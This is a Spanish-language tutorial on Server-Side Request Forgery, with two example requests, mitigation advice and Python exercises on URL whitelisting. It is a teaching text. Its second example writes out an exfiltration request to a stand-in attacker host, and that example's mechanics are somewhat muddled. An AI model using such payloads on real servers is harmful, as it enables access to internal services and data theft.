Introducción

Server-Side Request Forgery (SSRF) es una vulnerabilidad en la que un atacante puede hacer que el servidor realice solicitudes HTTP a un dominio arbitrario. Esta vulnerabilidad puede permitir a los atacantes acceder a recursos internos, exfiltrar datos sensibles y realizar otras acciones maliciosas.

Conceptos Clave

  • Definición de SSRF: Vulnerabilidad que permite a un atacante manipular las solicitudes que un servidor realiza a otros servidores.
  • Impacto: Puede llevar a la exposición de datos internos, ejecución de comandos remotos y otras actividades maliciosas.
  • Vectores de ataque: URLs manipuladas, parámetros de entrada no validados, servicios internos accesibles.

Ejemplos de SSRF

Ejemplo 1: Solicitud HTTP Manipulada

Un atacante puede manipular una solicitud HTTP para que el servidor acceda a una URL interna:

GET /fetch?url=http://internal-service.local/admin
Host: vulnerable-website.com

En este caso, el servidor podría realizar una solicitud a http://internal-service.local/admin, exponiendo información sensible.

Ejemplo 2: Exfiltración de Datos

Un atacante puede usar SSRF para exfiltrar datos sensibles:

GET /fetch?url=http://attacker.com?data=http://internal-service.local/secret
Host: vulnerable-website.com

El servidor podría enviar datos sensibles a http://attacker.com.

Mitigación de SSRF

  • Validación de Entradas: Validar y sanitizar todas las entradas que se utilizan para construir URLs.
  • Lista Blanca de URLs: Implementar una lista blanca de URLs permitidas para evitar que el servidor acceda a recursos no autorizados.
  • Restricciones de Red: Configurar reglas de firewall para limitar el acceso del servidor a recursos internos y externos.
  • Autenticación y Autorización: Asegurarse de que las solicitudes internas requieran autenticación y autorización adecuadas.

Ejercicio Práctico

Ejercicio 1: Identificación de SSRF

Dado el siguiente fragmento de código, identifique posibles vulnerabilidades de SSRF:

import requests

def fetch_data(url):
    response = requests.get(url)
    return response.content

data = fetch_data("http://example.com/data")
print(data)

Ejercicio 2: Mitigación de SSRF

Modifique el código anterior para mitigar la vulnerabilidad de SSRF utilizando una lista blanca de URLs permitidas:

import requests

ALLOWED_URLS = ["http://example.com/data"]

def fetch_data(url):
    if url not in ALLOWED_URLS:
        raise ValueError("URL no permitida")
    response = requests.get(url)
    return response.content

data = fetch_data("http://example.com/data")
print(data)

Conclusión

SSRF es una vulnerabilidad crítica que puede tener graves consecuencias si no se mitiga adecuadamente. Es esencial que los desarrolladores y profesionales de TI comprendan cómo identificar y prevenir SSRF mediante la validación de entradas, el uso de listas blancas y la implementación de restricciones de red. Al seguir estas prácticas, se puede reducir significativamente el riesgo de ataques SSRF y proteger los sistemas y datos sensibles.
